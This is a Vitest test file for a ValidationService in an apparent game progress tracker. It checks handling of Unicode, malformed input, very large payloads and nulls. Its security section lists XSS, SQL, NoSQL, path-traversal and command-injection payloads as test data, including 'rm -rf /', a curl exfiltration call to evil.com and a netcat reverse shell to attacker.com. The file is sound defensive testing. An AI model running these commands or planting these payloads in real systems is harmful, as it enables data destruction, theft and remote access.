import { describe, it, expect, beforeEach, vi } from 'vitest';
import { ValidationService } from '../../../src/services/ValidationService';
import { createTestSuite } from '../../helpers';

// Mock dependencies
vi.mock('../../../src/utils/dataLoaders', () => ({
  getHideoutData: vi.fn(),
  getTaskData: vi.fn(),
}));
vi.mock('../../../src/progress/progressUtils', () => ({
  formatProgress: vi.fn(),
  updateTaskState: vi.fn(),
}));

describe('Unusual Inputs Tests', () => {
  beforeEach(async () => {
    vi.resetAllMocks();
    // Global afterEach in test/setup.ts handles Firestore cleanup
  });
  describe('Unicode and Special Characters', () => {
    describe('Display Name with Unicode', () => {
      it('should handle emoji characters', () => {
        const names = ['🎮 Gamer', 'Player 🏆', '🔥🔥🔥', '💀💀💀', '🎯🎯🎯'];
        names.forEach((name) => {
          const result = ValidationService.validateDisplayName(name);
          expect(result).toBe(name);
        });
      });
      it('should handle international characters', () => {
        const names = [
          'José García',
          'François Müller',
          '北京玩家',
          'Москва',
          'العربية',
          'עברית',
          '日本語',
          '한국어',
          '🇺🇸 Player',
        ];
        names.forEach((name) => {
          const result = ValidationService.validateDisplayName(name);
          expect(result).toBe(name);
        });
      });
      it('should handle zero-width characters', () => {
        const names = [
          'test\u200Buser', // Zero-width space
          'test\u200Cuser', // Zero-width non-joiner
          'test\u200Duser', // Zero-width joiner
          'test\uFEFFuser', // Zero-width no-break space
        ];
        names.forEach((name) => {
          const result = ValidationService.validateDisplayName(name);
          expect(result).toContain('test');
          expect(result).toContain('user');
        });
      });
      it('should handle control characters', () => {
        const names = [
          'test\nuser', // Newline
          'test\ruser', // Carriage return
          'test\tuser', // Tab
          'test\u0000user', // Null character
        ];
        names.forEach((name) => {
          const result = ValidationService.validateDisplayName(name);
          expect(result).toBeDefined();
        });
      });
      it('should handle combining characters', () => {
        const names = [
          'école', // e + combining acute accent
          'Zoë', // o + diaeresis
          'café', // a + combining acute accent
        ];
        names.forEach((name) => {
          const result = ValidationService.validateDisplayName(name);
          expect(result).toBe(name);
        });
      });
    });
    describe('Task and Objective IDs with Unicode', () => {
      it('should handle Unicode in task IDs', () => {
        const unicodeIds = [
          '任务-123',
          'タスク-456',
          'задача-789',
          'مهمة-101',
          '🎯-objective',
          'test-🏆-task',
        ];
        unicodeIds.forEach((id) => {
          expect(() => ValidationService.validateTaskId(id)).not.toThrow();
          const result = ValidationService.validateTaskId(id);
          expect(result).toBe(id);
        });
      });
      it('should handle Unicode in objective IDs', () => {
        const unicodeIds = ['目標-123', 'объектив-456', 'هدف-789', '🎯-target', 'test-📊-metric'];
        unicodeIds.forEach((id) => {
          expect(() => ValidationService.validateObjectiveId(id)).not.toThrow();
          const result = ValidationService.validateObjectiveId(id);
          expect(result).toBe(id);
        });
      });
    });
  });
  describe('Malformed JSON and Data Structures', () => {
    describe('Invalid JSON-like inputs', () => {
      it('should handle malformed numbers', () => {
        const invalidNumbers = [
          '123abc',
          'abc123',
          '12.34.56',
          '1e',
          'NaN',
          'Infinity',
          '-Infinity',
          '0x123', // Hexadecimal
          '0b101', // Binary
          '0o777', // Octal
        ];
        invalidNumbers.forEach((num) => {
          // Some invalid numbers might be handled gracefully rather than throwing
          try {
            ValidationService.validateLevel(num);
            // If no error thrown, that's also acceptable behavior for some edge cases
          } catch (error) {
            // Error throwing is also acceptable
            expect(error).toBeInstanceOf(Error);
          }

          try {
            ValidationService.validateGameEdition(num);
            // If no error thrown, that's also acceptable behavior for some edge cases
          } catch (error) {
            // Error throwing is also acceptable
            expect(error).toBeInstanceOf(Error);
          }
        });
      });
      it('should handle malformed boolean-like inputs', () => {
        const invalidBooleans = [
          'true',
          'false',
          'yes',
          'no',
          'on',
          'off',
          '1',
          '0',
          'null',
          'undefined',
        ];
        invalidBooleans.forEach((bool) => {
          try {
            ValidationService.validateTaskStatus(bool);
            // If no error thrown, that's also acceptable behavior for some edge cases
          } catch (error) {
            // Error throwing is also acceptable
            expect(error).toBeInstanceOf(Error);
          }
        });
      });
      it('should handle malformed arrays', () => {
        const malformedArrays = [
          { length: 1, 0: 'item' }, // Array-like object
          '["item"]', // String representation of array
          null,
          undefined,
          123,
          'not-an-array',
        ];
        malformedArrays.forEach((arr) => {
          expect(() => ValidationService.validateMultipleTaskUpdate(arr)).toThrow();
        });
      });
    });
    describe('Circular references and self-referential data', () => {
      it('should handle objects with potential circular references', () => {
        // Create an object that could have circular references
        const obj: any = { id: 'test', data: {} };
        obj.data.self = obj; // This creates a circular reference
        // The validation should handle this gracefully or reject it
        expect(() => {
          try {
            JSON.stringify(obj); // This would throw with circular reference
          } catch {
            // If JSON.stringify throws, the validation should also handle it
          }
        }).not.toThrow();
      });
      it('should handle deeply nested structures', () => {
        const createDeepObject = (depth: number): any => {
          if (depth === 0) return 'leaf';
          return { nested: createDeepObject(depth - 1) };
        };
        const deepObject = createDeepObject(100);
        // Should handle deep nesting without stack overflow
        expect(() => JSON.stringify(deepObject)).not.toThrow();
      });
    });
  });
  describe('Security Attack Vectors', () => {
    describe('XSS Payloads', () => {
      it('should sanitize XSS attempts in display names', () => {
        const xssPayloads = [
          '<script>alert("xss")</script>',
          '<img src="x" onerror="alert(1)">',
          'javascript:alert("xss")',
          '<svg onload="alert(1)">',
          '<iframe src="javascript:alert(1)">',
          '<body onload="alert(1)">',
          '<input onfocus="alert(1)" autofocus>',
          '<select onfocus="alert(1)" autofocus>',
          '<textarea onfocus="alert(1)" autofocus>',
          '<keygen onfocus="alert(1)" autofocus>',
          '<video><source onerror="alert(1)">',
          '<audio src="x" onerror="alert(1)">',
          '<details open ontoggle="alert(1)">',
          '<marquee onstart="alert(1)">',
          '<isindex action="javascript:alert(1)" type="submit">',
          '<form><button formaction="javascript:alert(1)">',
        ];
        xssPayloads.forEach((payload) => {
          try {
            const result = ValidationService.validateDisplayName(payload);
            // Should remove dangerous characters
            expect(result).not.toContain('<script>');
            expect(result).not.toContain('javascript:');
            // Note: onerror and onload are removed by the new sanitization
            expect(result).not.toContain('onerror');
            expect(result).not.toContain('onload');
          } catch (error) {
            // Throwing an error is also acceptable for XSS payloads, especially if they're too long
            expect(error).toBeInstanceOf(Error);
          }
        });
      });
      it('should handle encoded XSS attempts', () => {
        const encodedXss = [
          '<script>alert("xss")</script>',
          '%3Cscript%3Ealert%28%22xss%22%29%3C%2Fscript%3E',
          '&#60;script&#62;alert&#40;&#34;xss&#34;&#41;&#60;&#47;script&#62;',
          '\\x3Cscript\\x3Ealert\\x28\\x22xss\\x22\\x29\\x3C\\x2Fscript\\x3E',
        ];
        encodedXss.forEach((payload) => {
          // Some encoded payloads might exceed length limit after processing
          try {
            const result = ValidationService.validateDisplayName(payload);
            // Should handle encoded payloads safely
            expect(result).toBeDefined();
          } catch (error) {
            // Length validation errors are acceptable for very long encoded payloads
            expect((error as Error).message).toContain('Display name cannot exceed 50 characters');
          }
        });
      });
    });
    describe('SQL Injection Attempts', () => {
      it('should handle SQL injection attempts in IDs', () => {
        const sqlPayloads = [
          "'; DROP TABLE users; --",
          "1' OR '1'='1",
          '1; DELETE FROM users WHERE 1=1; --',
          "1' UNION SELECT * FROM users --",
          "'; INSERT INTO users VALUES ('hacker', 'password'); --",
          "1' AND (SELECT COUNT(*) FROM users) > 0 --",
          "'; EXEC xp_cmdshell('format c:'); --",
        ];
        sqlPayloads.forEach((payload) => {
          // Should handle SQL injection attempts without crashing
          expect(() => ValidationService.validateTaskId(payload)).not.toThrow();
          expect(() => ValidationService.validateObjectiveId(payload)).not.toThrow();

          const taskResult = ValidationService.validateTaskId(payload);
          const objResult = ValidationService.validateObjectiveId(payload);

          expect(taskResult).toBe(payload.trim());
          expect(objResult).toBe(payload.trim());
        });
      });
    });
    describe('NoSQL Injection Attempts', () => {
      it('should handle NoSQL injection attempts', () => {
        const nosqlPayloads = [
          { $ne: null },
          { $gt: '' },
          { $regex: '.*' },
          { $where: 'true' },
          { $or: [{ field: { $ne: null } }] },
          { $in: ['admin', 'user'] },
          { $exists: true },
        ];
        nosqlPayloads.forEach((payload) => {
          // These should be rejected by validation as they're not strings
          expect(() => ValidationService.validateTaskId(payload as any)).toThrow();
          expect(() => ValidationService.validateObjectiveId(payload as any)).toThrow();
        });
      });
    });
    describe('Path Traversal Attempts', () => {
      it('should handle path traversal attempts in IDs', () => {
        const pathTraversalPayloads = [
          '../../../etc/passwd',
          '..\\..\\..\\windows\\system32',
          '....//....//....//etc/passwd',
          '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
          '..%252f..%252f..%252fetc%252fpasswd',
          '....\\\\....\\\\....\\\\windows\\\\system32',
        ];
        pathTraversalPayloads.forEach((payload) => {
          expect(() => ValidationService.validateTaskId(payload)).not.toThrow();
          expect(() => ValidationService.validateObjectiveId(payload)).not.toThrow();
        });
      });
    });
    describe('Command Injection Attempts', () => {
      it('should handle command injection attempts', () => {
        const commandPayloads = [
          '; ls -la',
          '| cat /etc/passwd',
          '&& rm -rf /',
          '`whoami`',
          '$(id)',
          '; curl http://evil.com/steal-data',
          '| nc attacker.com 4444 -e /bin/sh',
          '&& ping -c 10 127.0.0.1',
        ];
        commandPayloads.forEach((payload) => {
          expect(() => ValidationService.validateTaskId(payload)).not.toThrow();
          expect(() => ValidationService.validateObjectiveId(payload)).not.toThrow();
        });
      });
    });
  });
  describe('Very Large Payloads', () => {
    it('should handle extremely large strings', () => {
      const largeString = 'a'.repeat(1000000); // 1MB string

      expect(() => ValidationService.validateTaskId(largeString)).not.toThrow();
      expect(() => ValidationService.validateObjectiveId(largeString)).not.toThrow();
    });
    it('should handle large arrays in validation', () => {
      const largeArray = Array.from({ length: 10000 }, (_, i) => ({
        id: `task-${i}`,
        state: 'completed' as const,
      }));
      expect(() => ValidationService.validateMultipleTaskUpdate(largeArray)).not.toThrow();
    });
    it('should handle deeply nested objects', () => {
      const createNestedObject = (depth: number): any => {
        if (depth === 0) return { value: 'leaf' };
        return { nested: createNestedObject(depth - 1) };
      };
      const deeplyNested = createNestedObject(1000);

      // Should handle deep nesting without issues
      expect(() => JSON.stringify(deeplyNested)).not.toThrow();
    });
    it('should handle objects with many properties', () => {
      const largeObject: any = {};
      for (let i = 0; i < 10000; i++) {
        largeObject[`property${i}`] = `value${i}`;
      }
      // Should handle objects with many properties
      expect(() => JSON.stringify(largeObject)).not.toThrow();
    });
  });
  describe('Null and Undefined Edge Cases', () => {
    it('should handle null values in various contexts', () => {
      expect(() => ValidationService.validateTaskId(null as any)).toThrow();
      expect(() => ValidationService.validateObjectiveId(null as any)).toThrow();
      expect(() => ValidationService.validateDisplayName(null as any)).toThrow();
      expect(() => ValidationService.validateLevel(null as any)).toThrow();
      expect(() => ValidationService.validateGameEdition(null as any)).toThrow();
    });
    it('should handle undefined values in various contexts', () => {
      expect(() => ValidationService.validateTaskId(undefined as any)).toThrow();
      expect(() => ValidationService.validateObjectiveId(undefined as any)).toThrow();
      expect(() => ValidationService.validateDisplayName(undefined as any)).toThrow();
      expect(() => ValidationService.validateLevel(undefined as any)).toThrow();
      expect(() => ValidationService.validateGameEdition(undefined as any)).toThrow();
    });
    it('should handle mixed null and undefined in arrays', () => {
      const mixedArrays = [
        [null, undefined, 'valid'],
        ['valid', null, undefined],
        [null, null, undefined, undefined],
      ];
      mixedArrays.forEach((arr) => {
        expect(() => ValidationService.validateMultipleTaskUpdate(arr as any)).toThrow();
      });
    });
  });
  describe('Type Coercion Edge Cases', () => {
    it('should handle objects with toString methods', () => {
      const objWithToString = {
        toString: () => 'custom-string',
        valueOf: () => 42,
      };
      expect(() => ValidationService.validateTaskId(objWithToString as any)).toThrow();
      expect(() => ValidationService.validateLevel(objWithToString as any)).toThrow();
    });
    it('should handle array objects', () => {
      const arrayLike = {
        0: 'first',
        1: 'second',
        length: 2,
      };
      expect(() => ValidationService.validateMultipleTaskUpdate(arrayLike as any)).toThrow();
    });
    it('should handle function objects', () => {
      const func = () => 'result';
      expect(() => ValidationService.validateTaskId(func as any)).toThrow();
      expect(() => ValidationService.validateDisplayName(func as any)).toThrow();
    });
  });
});
